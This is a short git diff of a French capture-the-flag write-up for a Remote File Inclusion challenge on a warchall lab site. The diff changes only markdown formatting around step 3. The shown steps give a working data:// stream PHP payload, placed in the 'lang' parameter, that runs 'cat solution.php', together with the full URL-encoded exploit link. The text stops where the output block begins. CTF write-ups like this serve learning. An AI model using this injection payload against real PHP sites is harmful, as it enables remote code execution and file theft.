@@ -6,7 +6,7 @@ Pour notre probleme, il faut voir le contenu de fichier *solution.php*
 **Etape à suivre**
 1. Allez dans le lien principal de [RFI](https://rfi.warchall.net/)
 2. Cliquer sur le logo de langue (choix de langue) => exemple : [RFI langue](https://rfi.warchall.net/index.php?lang=en)
-3. Effacer "en" et remplacer par la methode d'attaque Data stream => data://text/plain,<?php echo`cat solution.php`; ?>
+3. Effacer "en" et remplacer par la methode d'attaque Data stream => __data://text/plain,<?php echo`cat solution.php`; ?>__
 [lien complet](https://rfi.warchall.net/index.php?lang=data://text/plain,%3C?php%20echo`cat%20solution.php`;%20?%3E)
 4. Après, il donne ça : 
 ````sh
